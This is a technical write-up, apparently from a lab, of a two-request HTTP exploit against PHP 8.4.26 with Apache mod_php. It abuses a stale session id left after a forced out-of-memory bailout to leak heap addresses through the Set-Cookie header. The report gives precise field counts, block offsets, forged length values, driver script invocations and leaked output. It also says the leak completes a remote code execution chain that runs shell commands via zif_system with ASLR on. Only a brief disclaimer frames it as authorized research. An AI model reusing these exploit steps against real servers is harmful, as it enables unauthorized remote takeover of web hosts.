# Pure HTTP Heap Address Leak: stale `PS(id)` + out-of-bounds read via `Set-Cookie`

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64, `172.16.0.103`)
Constraints: **fully remote, HTTP only; no target-specific PHP files written into the target webroot**. The target page is only
`<?php echo "OK\n"; ?>` (no session calls; this leak does not depend on script contents).
Status: **the heap address (Zend MM 2MB chunk base) leak is complete**; the libphp/libc **code pointer** leak
is not finished yet — see Section 7 for next steps.

---

## 1. Result

With two pure HTTP requests, we obtain a **4096-byte heap out-of-bounds read** from the response header `Set-Cookie`:

- Request A: first use 1001 POST fields to trigger the `max_input_vars` warning (with `display_errors=On`
  the warning is emitted and `SG(headers_sent)=1`), then use a `PHPSESSID` field whose value is a single byte `\x00`
  so that `php_session_initialize()` generates a new id and sets `send_cookie=1`; subsequently
  `php_session_reset_id()` **fails to send the cookie** because headers were already sent, leaving `send_cookie`
  as 1. At the end of A, a 12MB field triggers OOM, leaving a dangling `PS(id)` (the
  `zend_string` of the random id).
- Request B: with no file fields, the pre-RINIT upload-progress END cleanup calls
  `php_session_initialize()`, and `php_session_reset_id()` sees `send_cookie=1`
  and that this request's headers have not been sent yet, so it builds
  `Set-Cookie: PHPSESSID=<url_encode(ZSTR_VAL(id), ZSTR_LEN(id))>` from the dangling `PS(id)`.
- B's multipart fields re-occupy the block left over from A's `PS(id)` with a forged `zend_string` header:
  `len=0x1000`, `data` pointing to offset 0x18 within the block. `php_url_encode` reads by len,
  going past the end of the block into adjacent heap, encoding the contents into `Set-Cookie`.

Measured (no-ASLR calibration):

```text
Set-Cookie: PHPSESSID=LAAAA...%B2%D0%82f%60h%3F...%F5%FF%7F...
cookie value 11548 characters (URL-encoded), 4096 bytes after decoding
98 pointers of the form 0x7f...., all & ~0x1fffff == 0x7ffff5e00000
```

That is, **the Zend MM chunk base can be recovered directly from the HTTP response header**, without
`/proc/self/maps`, without target-side PHP, and without any cooperation from the target application.

> This is orthogonal to the pure-HTTP RCE chain in `NOASLR_REPORT.md`: leak request A fails
> before `track_init` (`reset_id` fails), so it does **not** leave `PS(http_session_vars)` dangling references;
> it only leaves a dangling `PS(id)` and `send_cookie=1`.

---

## 2. Mechanism and source path

### 2.1 Making `send_cookie` remain 1

`ext/session/session.c`:

```c
static zend_result php_session_initialize(void)
{
    ...
    if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {      /* empty id -> create new id */
        ...
        PS(id) = PS(mod)->s_create_sid(&PS(mod_data));
        ...
        if (PS(use_cookies)) {
            PS(send_cookie) = 1;
        }
    }
    ...
    if (php_session_reset_id() == FAILURE) {    /* fails here; track_init will not run */
        php_session_abort();
        return FAILURE;
    }
    php_session_track_init();
    ...
}
```

`php_session_send_cookie()`:

```c
if (SG(headers_sent)) {
    php_error_docref(NULL, E_WARNING,
        "Session cookie cannot be sent after headers have already been sent");
    return FAILURE;
}
e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
```

Key points:

1. **headers_sent must be 1**. Achieved via the `max_input_vars` limit warning:
   in `main/php_variables.c`, when the variable count exceeds 1000 it calls
   `php_error_docref(NULL, E_WARNING, "Input variables exceeded ...")`;
   the lab has `display_errors=On`, so the warning is written to the response and sets `SG(headers_sent)=1`.
2. **The id's first byte is 0**. The multipart `PHPSESSID` value takes a single byte `\x00`:
   the FORMDATA branch of `php_session_rfc1867_callback` requires `value_len != 0`,
   so `progress->sid` is set to a string of length 1 with content `\0`; in FILE_START,
   after `PS(id) = zend_string_init(progress->sid)`, `!ZSTR_VAL(PS(id))[0]`
   holds, entering the "create new id" branch, setting `send_cookie=1`.
3. `reset_id` fails due to headers_sent → `send_cookie` stays 1, and
   `php_session_track_init()` does not run (so there is no `$_SESSION` reference).
4. At the end of A, a 12MB plain field triggers OOM with `memory_limit=8M`; the bailout skips request
   shutdown, leaving `ps_globals.id` dangling (the 32-byte `zend_string` of the random id).

Measured after A (gdb, setarch -R):

```text
ps_globals.send_cookie = 1
ps_globals.id          = 0x7ffff5ea9000   (len=32, data0=0x35)
ps_globals.http_session_vars.type_info = 0 (UNDEF)
```

The response body also contains two key warnings, which serve as a remote-side "preconditions met" signal:

```html
Warning: PHP Request Startup: Input variables exceeded 1000...
Warning: PHP Request Startup: Session cookie cannot be sent after headers have already been sent
```

### 2.2 B: sending `Set-Cookie` with the dangling `PS(id)`

B has no file fields, so it does not trigger FILE_START's `php_rinit_session(0)` (which would clear
the PS globals). The multipart END event → `php_session_rfc1867_cleanup()` →
`php_session_initialize()` → `php_session_reset_id()`:

- `PS(use_cookies)=1` (default);
- `PS(send_cookie)=1` (left over from A);
- B's own headers have not been sent yet in this request → the cookie is actually sent;
- `php_url_encode` reads with `ZSTR_LEN(PS(id))` as the length and `ZSTR_VAL(PS(id))` as the start.
  Once the dangling block is re-occupied by B's fields, len/data are fully attacker-controlled.

### 2.3 Re-occupying the dangling `PS(id)` block

A's random id has length 32; `zend_string_alloc(32)` = 24+32+1 = 57 → **64-byte bin**;
in this lab's shape the block address is `chunk + 0xa9000` (no-ASLR: `0x7ffff5ea9000`).

B's multipart parsing re-pages the chunk at request startup. Calibration found that in B's
layout the stale address falls in the **80-byte bin page**:

1. First send N fields with 48-byte values (`zend_string` = 24+48+1 = 73 → 80B bin).
   Each field leaves a **live** 80-byte string, occupying blocks in free-list order.
2. Using a unique 48-character value per field (`v%04d` + `x`) lets you read out "which block
   landed on the stale address": in this lab with `N=998`, the `Set-Cookie` value is `v0892...`,
   i.e. the string of the 893rd field landed on that block.
3. Instead send **892** priming fields, then 1 forge field with a **79-byte value**:
   - raw buffer size 79+1 = 80 → 80B bin;
   - its value `zend_string` is 24+79+1 = 104 → 112B bin (does not occupy the 80B block);
   - the raw buffer takes exactly "the 893rd 80B block" = the stale `PS(id)` block.
   Layout of the raw buffer contents (block start is S, `PS(id)=S`):

   ```text
   S+0x00: gc (overwritten by the efree'd free-list next, no impact)
   S+0x08: h (anything)
   S+0x10: len = 0x1000 (forged)
   S+0x18: data[0] = 'L', followed by padding
   ```

4. After the field is processed, the raw buffer is `efree()`d; Zend MM writes only the free-list pointer
   to block offset 0, and the len at `+0x10` survives. B's END cleanup then reads
   `ZSTR_LEN(PS(id)) = 0x1000` and starts URL encoding from `S+0x18`.

After `Set-Cookie` is sent, `php_session_valid_key()` in `ps_files_open()` fails because the id
contains illegal bytes, producing a
`Session ID is too long or contains illegal characters` warning — by then the leak has already
been written into the response headers; the warning does not affect the result.

---

## 3. Reproduction steps

Environment (same as `NOASLR_REPORT.md`, plus two notes):

- `display_errors=On` (headers_sent depends on the warning actually being printed);
- `session.use_cookies=1` (default; the lab once had it set to 0, it must be set back);
- `memory_limit=8M`, `session.use_strict_mode=0`, `session.save_path=/tmp`,
  `max_input_vars=1000` (default).

```bash
# Target machine 172.16.0.103; works with ASLR on or off; the following are the calibrated no-ASLR commands
cd ~/php2shell-work

# A: 1001 fields trigger the max_input_vars warning; PHPSESSID is a single byte \x00;
#    a file field triggers FILE_START; a 12MB field causes OOM
python3 send_a_leak2.py 1001 12

# B: 892 numeric fields with 48-character values consume the 80B blocks; the last 79-byte-value field's
#    raw buffer lands on the dangling PS(id) block, forging len=0x1000
python3 b_numleak2.py 892 1 0x1000
```

Example of B's response headers (truncated):

```text
Set-Cookie: PHPSESSID=LAAAA...%B2%D0%82f%60h%3F%C3%A0%90%EA%F5%FF%7F...
...
Warning: PHP Request Startup: Session ID is too long or contains illegal characters.
```

Decoding and pointer extraction:

```bash
python3 tools/decode_leak.py logs/http_heap_leak_20261021.resp
# decoded=4096, candidate_ptrs=98, chunk_bases=7ffff5e00000:98
```

Raw response archive: `logs/http_heap_leak_20261021.resp`; analysis output:
`logs/http_heap_leak_20261021.txt`.

---

## 4. Calibration data (this build / this request shape)

| Item | Value |
|---|---|
| `PS(id)` after A (stale `zend_string`) | `0x7ffff5ea9000` = chunk + `0xa9000` |
| id length / block size | 32 / 64B bin |
| Bin the block falls into after B's re-occupation | 80B |
| Number of priming 48-character fields (localization) | with `N=998`, value `v0892` lands on the block |
| Number of priming fields before forge | `K=892` |
| Forge field value length | 79 (raw 80B) |
| Forged len | `0x1000` |
| B response `Set-Cookie` | 11548 characters (4096B decoded) |
| Leaked pointers | 98, all `0x7ffff5e…`, chunk base `0x7ffff5e00000` |

Additional evidence (reuse of the same stale address):

- With `N=998` and unique 48-character values, the cookie value is exactly `v0892...` (len=48) — meaning
  the block was re-occupied by a live 80B string;
- With numeric keys + short values (`b_numleak.py`), the cookie still contains a normal 32-character id —
  meaning the block was unused; only 80B live string/raw allocation sequences can hit it.

---

## 5. Relation to the ASLR chain

This leak provides the **Zend MM chunk base**. In the same round of experiments, verified with an external address source:

- The calibrated pure-HTTP A/B RCE chain succeeds **3/3** with `personality=0` (ASLR on);
- It relies only on offsets relative to the chunk: `R0 = chunk + 0x24e0`, fake HT data =
  `chunk + 0x6e0d8` (the concrete A/B shapes are below);
- With libc base obtained externally via `/proc/<worker>/maps`, `system = libc + 0x4c490`,
  and the chain executes `id>/tmp/p1` end to end.

In other words: **the A/B memory chain itself is ASLR-independent**; only the "address source" is missing. The
Set-Cookie leak in this section has covered the heap base; what is still missing is a **libphp code pointer**
(for `zif_system`, libphp + `0x43a870`, which does not need libc) or a libc pointer.

### 5.1 No-ASLR recalibration obtained in the same round

On `172.16.0.103` (not the original report's 172.16.1.112), the original report's fixed parameters do not directly apply:

```text
A: send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
B: send_b_rce2.py 16 2 0x7ffff5e6e0d8 0x7ffff7d14490 "id>/tmp/p1"
```

- The 6 `7:7` pads move A's reference address to `0x7ffff5e024e0`,
  and `R0-0x10=0x7ffff5e024d0` is exactly the start of a 56B block;
- B needs `N1=16` (31-character priming fields) for the 55B raw buffer to land on
  `R0-0x10`;
- On this machine libc `system = 0x7ffff7d14490` (offset `0x4c490`), fake HT data =
  `0x7ffff5e6e0d8`;
- proof: `/tmp/p1` contains `uid=33(www-data) ...`.

---

## 6. Limitations

1. **`display_errors=On` is a precondition**. headers_sent comes from the warning output; if the target
   disables display_errors, this path's `send_cookie=1` remnant does not hold (the current lab has it On).
2. Requires `>1000` POST variables (default `max_input_vars=1000`) to trigger the warning;
   the request body is on the order of 1MB.
3. Requires `session.use_cookies=1` (default) and `session.use_strict_mode=0` (default 0).
4. The within-chunk offsets (`0xa9000`), `N=998`, and `K=892` are bound to this build + this request shape;
   changing the PHP build / field lengths / boundary lengths requires re-measurement. They are all
   **chunk-relative offsets**, independent of ASLR.
5. The leak only reads toward higher addresses (starting at `PS(id)+0x18`). The current 4KB region is an
   80B-string page containing only heap pointers; the 1MB larger-range leak (verified sendable) still only
   shows heap pointers, with no libphp/libc code pointers.
6. If len reads an uncontrolled value (e.g. a HashTable's `arData` / 64-bit hash),
   `php_url_encode`'s `safe_emalloc` will hit a fatal directly:
   `Possible integer overflow in memory allocation (3 * N + 32)`.
   This is itself a "len is uncontrolled" signal, but no data can be obtained.
7. Leak A does not produce a dangling `PS(http_session_vars)` reference (`reset_id` fails
   before `track_init`), so it cannot be merged with the RCE's A into a single request;
   the two are independent primitives that can be used in sequence on the same worker.

---

## 7. Next step: leaking a libphp code pointer

> **Follow-up progress (2026-10-21, completed)**: the goal of this section has been achieved, and the pure-HTTP
> ASLR-on RCE was further completed (two Set-Cookie leaks + `zif_system`), 5/5 in the lab. Approach:
> A uses 1001 fields with 39-byte values to place the stale `PS(id)` at `chunk+0xb7400`; B uses 983
> nested arrays to expand `$_POST['a0443']`'s HashTable to 16 elements. `PS(id)+0x10` reads
> `nTableSize=16`, and the data region covers `nNextFreeElement` and `pDestructor`
> (`ZVAL_PTR_DTOR = libphp+0x613c50`). For the full chain, payloads and driver, see
> [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md). The original analysis is preserved below.

Goal: obtain a libphp code address (for example, the HashTable's
`pDestructor = ZVAL_PTR_DTOR`), and combined with the known chunk base use g18's
Zend-only payload (`zif_system`, libphp + `0x43a870`) to complete a **fully pure-HTTP,
no external addresses** ASLR-on RCE.

Confirmed experimental facts:

- When using 998 `aNNNN[0]` nested-array fields, many 56B HashTable pages appear in B's chunk; a gdb scan
  (no-ASLR) shows these pages contain 73 libphp pointers per page, with offsets including
  `0x2000, 0x76000, 0x7b000, …, 0xa9000, 0xad000, 0xb2000, …`.
- The current stale `PS(id)` is at `chunk+0xa9000`; under nested-array B that offset is
  exactly a 56B HashTable page. The problem becomes: **make the qword at `PS(id)+0x10`
  a moderate len, not an `arData`/hash pointer**.
- Feasible directions (by priority):
  1. Adjust A so that `PS(id)` lands on `HT + 0x18` (then
     `len = nNextFreeElement`, and data starts at `HT+0x30 = pDestructor`):
     requires `PS(id) ≡ page + 0x18 (mod 56)`; from `PS(id)=page+64m`
     (A's 64B bin) we get `m ≡ 3 (mod 7)`, i.e. `page+0xc0`, `page+0x280`, etc.
     Scan A's field lengths/boundary lengths/file field shapes to find a reachable offset.
  2. Or make `PS(id)+0x10` land on `HT+0x20` (`len = nTableSize|nInternalPointer`):
     requires `PS(id) ≡ page + 0x10 (mod 56)`, corresponding to `m ≡ 2 (mod 7)`
     (`page+0x80`, etc.), and make that HashTable's `nTableSize` large enough
     (e.g. 128 elements per array → len=128, enough to cover `pDestructor`).
  3. Move PS.id to a low offset of the libphp pointer pages (e.g. `0x2000`) — requires a smaller
     A pre-heap or a different warning trigger; currently 1001 fields put the id at no lower than
     about `0x61040`.
- Once the libphp base is obtained, the RCE's B uses `zif_system` + fake `zend_function`/
  `execute_data` (the Zend-only payload layout of `tools/d_aslr.php`),
  needing only the chunk base + libphp base, no libc.

---

## 8. Files

| File | Purpose |
|---|---|
| `tools/send_a_leak2.py` | Leak A: 1001 fields + `max_input_vars` warning + empty/NUL PHPSESSID + file + OOM |
| `tools/send_a_leak3.py` | Leak A variant: adjustable field name/value lengths, boundary lengths (for moving `PS(id)`) |
| `tools/b_numleak.py` | B: numeric keys, short values (to confirm whether the stale block is overwritten) |
| `tools/b_numleak2.py` | **Final B**: 48-character values consume 80B blocks + 79-byte forge field |
| `tools/b_consume.py` / `b_consume2.py` | 80B/64B block consumption experiments |
| `tools/b_nested.py` | Nested-array B (to spread 56B HashTable pages across the chunk) |
| `tools/send_b_leak.py` | Early B (bare stale id / forged-header prototype) |
| `tools/decode_leak.py` | Decodes `Set-Cookie`, extracts pointers and the chunk base |
| `tools/aslr_demo.sh` | ASLR-on verification: externally reads maps, proves 3/3 that the A/B chain's relative layout is stable |
| `logs/http_heap_leak_20261021.resp` | Raw leak response (4096B decoded / 11548-character cookie) |
| `logs/http_heap_leak_20261021.txt` | Decoded pointer list and chunk base statistics |

---

## 9. Disclaimer

For vulnerability research and reproduction in authorized environments only. The request shapes, block
offsets, and bin sequences are bound to this lab's PHP 8.4.26 build and Apache/mod_php configuration;
changing the build or configuration requires recalibration.
